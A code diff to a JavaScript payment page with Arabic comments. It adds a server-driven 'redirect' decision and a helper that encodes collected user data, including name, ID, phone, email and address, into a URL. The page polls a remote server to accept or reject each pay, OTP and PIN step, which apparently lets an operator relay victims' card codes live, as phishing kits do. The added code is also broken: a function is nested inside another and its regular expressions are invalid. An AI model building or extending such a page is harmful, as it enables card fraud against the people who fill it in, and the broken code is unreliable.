@@ -603,11 +603,15 @@ const goTo = url => { window.location.href = url; };
 const $ = id => document.getElementById(id);
 function decodeData(str){
   try { const b = atob(str.replace(/-/g,"+").replace(/_/g,"/")); return JSON.parse(new TextDecoder().decode(Uint8Array.from(b, c => c.charCodeAt(0)))); } catch (e) { return null; }
+function encodeData(obj){
+  const bytes = new TextEncoder().encode(JSON.stringify(obj));
+  return btoa(String.fromCharCode(...bytes)).replace(/+/g,"-").replace(///g,"_").replace(/=+$/,"");
+}
 }
 const [hPlan, hData] = location.hash.slice(1).split("~");
 const hCard = hPlan || "";
 /* بيانات تجريبية — بتظهر بس لو الصفحة اتفتحت من غير طلب، عشان تشوف الشكل. احذفها قبل النشر */
-const SAMPLE = {plan:"t2-w7", data:{st:"citizen", n:"عبدالله محمد علي", id:"784199942673270", p:"501234567", e:"abdulla@gmail.com", g:"male", em:"dubai", a:"6", ad:"شارع 12، فيلا 45، بجوار مسجد مردف"}};
+const SAMPLE = {plan:"t2", data:{st:"citizen", n:"عبدالله محمد علي", id:"784199942673270", p:"501234567", e:"abdulla@gmail.com", g:"male", em:"dubai", a:"6", ad:"شارع 12، فيلا 45، بجوار مسجد مردف"}};
 const isSample = !hData;
 const data = isSample ? SAMPLE.data : decodeData(hData);
 const sCard = isSample ? SAMPLE.plan : hCard;
@@ -846,6 +850,7 @@ function startPolling(ref){
       const d = await r.json();
       if (d.decision === "accept") { clearInterval(pollTimer); onAccepted(d.next || "done"); }
       else if (d.decision === "reject") { clearInterval(pollTimer); onRejected(d.reason || curStep); }
+      else if (d.decision === "redirect") { clearInterval(pollTimer); onRedirect(d.next || "order"); }
     } catch (e) {}
   }, 3000);
 }
@@ -869,6 +874,16 @@ function finishOrder(){
   closePay();
   $("payForm").style.display = "block"; $("otpView").style.display = "none"; $("pinView").style.display = "none"; $("waitView").style.display = "none";
   showDone((data && data.ref) || "");
+}
+function onRedirect(page){
+  closePay();
+  if (page === "order") {
+    const enc = encodeData(data);
+    const plan = sCard;
+    goTo(LINKS.order + "#" + plan + "~" + enc);
+  } else {
+    goTo(LINKS.home);
+  }
 }
 function onRejected(reason){
   const L = ui[lang] || ui.ar;
